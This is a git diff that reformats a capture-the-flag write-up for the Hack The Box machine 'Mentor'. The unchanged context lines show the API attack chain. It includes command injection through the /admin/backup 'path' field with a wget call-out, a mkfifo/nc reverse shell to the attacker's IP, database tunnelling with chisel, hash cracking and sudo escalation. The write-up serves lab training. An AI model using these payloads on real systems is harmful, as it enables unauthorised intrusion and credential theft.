@@ -21,7 +21,7 @@ We have to add `mentorquotes.htb` to the `/etc/hosts` file to access port 80.
 
 The website has daily motivational quotes posted:
 
-<figure><img src="../../../.gitbook/assets/image (933).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(933).png>)
 
 Doing a subdomain enumeration reveals an `api` subdomain:
 
@@ -61,7 +61,7 @@ $ feroxbuster -u http://api.mentorquotes.htb
 
 These are some interesting endpoints, and I think viewing the Documentation is the most important.
 
-<figure><img src="../../../.gitbook/assets/image (1334).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1334).png>)
 
 This is a token-based API, so when we register a new user, it would return a JWT token to us. We either have to spoof the token to become the administrator to read sensitive information, OR we have to find an injection point for RCE.
 
@@ -69,7 +69,6 @@ One thing to take note of was the `Send email to James` link, which would send a
 
 Anyways we can create a user and login to retrieve our token:
 
-{% code overflow="wrap" %}
 ```
 $ curl -X POST http://api.mentorquotes.htb/auth/signup -H 'Content-Type: application/json' -d '{"email":"fakeuser@mentorquotes.htb", "username":"fakeuser","password":"password"}'
 {"id":4,"email":"fakeuser@mentorquotes.htb","username":"fakeuser"}
@@ -77,7 +76,6 @@ $ curl -X POST http://api.mentorquotes.htb/auth/signup -H 'Content-Type: applica
 $ curl -X POST http://api.mentorquotes.htb/auth/login -H 'Content-Type: application/json' -d '{"email":"fakeuser@mentorquotes.htb", "username":"fakeuser","password":"password"}'
 "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImZha2V1c2VyIiwiZW1haWwiOiJmYWtldXNlckBtZW50b3JxdW90ZXMuaHRiIn0.Y2pu-kYdv7R_UoO3_myPMvdL_WryFt4hjgC0KMxtV5A"
 ```
-{% endcode %}
 
 Then, to access other parts of the API, we need to use this token as part of the `Authorization` HTTP Header. However, we aren't allowed to do so:
 
@@ -88,7 +86,6 @@ $ curl -X POST http://api.mentorquotes.htb/users/ -H 'Authorization: eyJ0eXAiOiJ
 
 Now we already know that the user email is `james@mentorquotes.htb`, so let's try to register a user with the same email or the same username:
 
-{% code overflow="wrap" %}
 ```
 $ curl -X POST http://api.mentorquotes.htb/auth/signup -H 'Content-Type: application/json' -d '{"email":"james@mentorquotes.htb", "username":"fakeuser","password":"password"}'
 {"id":5,"email":"james@mentorquotes.htb","username":"fakeuser"}   
@@ -102,7 +99,6 @@ $ curl -X POST http://api.mentorquotes.htb/auth/signup -H 'Content-Type: applica
 $ curl -X POST http://api.mentorquotes.htb/auth/login -H 'Content-Type: application/json' -d '{"email":"testuser@mentorquotes.htb", "username":"james","password":"password"}'
 "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJ0ZXN0dXNlckBtZW50b3JxdW90ZXMuaHRiIn0.3TVUdA6FaHNPUnclViOgFk1Q2FlG-NaLNPFPuoxGa2A"
 ```
-{% endcode %}
 
 Surprisingly, both work. However, this would lead to nowhere as I still cannot access the API using any of these tokens.
 
@@ -165,18 +161,15 @@ iso.3.6.1.2.1.25.4.2.1.5.2090 = STRING: "/usr/local/bin/login.py kj23sadkj123as0
 
 Within the output, there's a password, and we can verify that this is for `james` on the API.
 
-{% code overflow="wrap" %}
 ```
 $ curl -X POST http://api.mentorquotes.htb/auth/login -H 'Content-Type: application/json' -d '{"email":"james@mentorquotes.htb", "username":"james","password":"kj23sadkj123as0-d213"}'
 "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0"
 ```
-{% endcode %}
 
 ### Command Injection
 
 We can finally enumerate the API properly with this token:
 
-{% code overflow="wrap" %}
 ```
 $ curl -X GET http://api.mentorquotes.htb/users/ -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' | jq
 [
@@ -212,7 +205,6 @@ $ curl -X GET http://api.mentorquotes.htb/users/ -H 'Authorization: eyJ0eXAiOiJK
   }
 ]
 ```
-{% endcode %}
 
 Earlier, we found an `/admin/backup` endpoint, so let's use that.
 
@@ -248,7 +240,6 @@ $ curl -X GET http://api.mentorquotes.htb/admin/backup -H 'Authorization: eyJ0eX
 
 It appears that the `/backup` one requires a JSON input. If an empty object is supplied, it complains and asks for a `path` variable.
 
-{% code overflow="wrap" %}
 ```
 $ curl -X POST http://api.mentorquotes.htb/admin/backup -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' -H 'Content-Type: application/json' -d '{"path":"/etc/passwd"}' | jq
 
@@ -256,11 +247,9 @@ $ curl -X POST http://api.mentorquotes.htb/admin/backup -H 'Authorization: eyJ0e
   "INFO": "Done!"
 }
 ```
-{% endcode %}
 
 I don't really know what they are doing in the backend, but we can try some command injection point just in case.
 
-{% code overflow="wrap" %}
 ```
 $ curl -X POST http://api.mentorquotes.htb/admin/backup -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' -H 'Content-Type: application/json' -d '{"path":"/etc/passwd; wget 10.10.14.13/rcecfm"}' | jq
 
@@ -274,11 +263,9 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.129.228.102 - - [08/May/2023 11:01:18] code 404, message File not found
 10.129.228.102 - - [08/May/2023 11:01:18] "GET /rcecfm/app_backkup.tar HTTP/1.1" 404
 ```
-{% endcode %}
 
 This was using `tar` on something, but more importantly our RCE worked. We can easily get a reverse shell using this after specifying some random `body` parameter:
 
-{% code overflow="wrap" %}
 ```http
 POST /admin/backup HTTP/1.1
 Host: api.mentorquotes.htb
@@ -297,9 +284,8 @@ Content-Length: 112
 "path": "test;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.13 443 >/tmp/f;"
 }
 ```
-{% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (3159).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3159).png>)
 
 There's no `/bin/bash` within this machine.
 
@@ -309,7 +295,6 @@ There's no `/bin/bash` within this machine.
 
 We can find a `config.py` file within `/app/app`.
 
-{% code overflow="wrap" %}
 ```python
 /app/app # cat db.py 
 import os
@@ -322,7 +307,6 @@ from databases import Database
 DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@172.22.0.1/mentorquotes_db")
 <TRUNCATED>
 ```
-{% endcode %}
 
 It appears there's a database present on this machine, we probably have to use `chisel` to tunnel to it.
 
@@ -335,7 +319,7 @@ chisel server -p 5555 --reverse
 
 Afterwards, we can access the database:
 
-<figure><img src="../../../.gitbook/assets/image (2987).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2987).png>)
 
 We can view the databases present:
 
@@ -375,11 +359,11 @@ mentorquotes_db=# select * from users;
 
 The hash for `svc` is crackable.
 
-<figure><img src="../../../.gitbook/assets/image (1446).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1446).png>)
 
 Then we can SSH in as `svc` and grab the user flag:
 
-<figure><img src="../../../.gitbook/assets/image (3018).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3018).png>)
 
 ### Sudo /bin/sh
 
@@ -408,4 +392,4 @@ access AllGroup "" any noauth exact AllView none non
 
 We can then `su` to `james` using this and check our `sudo` privileges, finding that getting a `root` shell is easy:
 
-<figure><img src="../../../.gitbook/assets/image (804).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(804).png>)
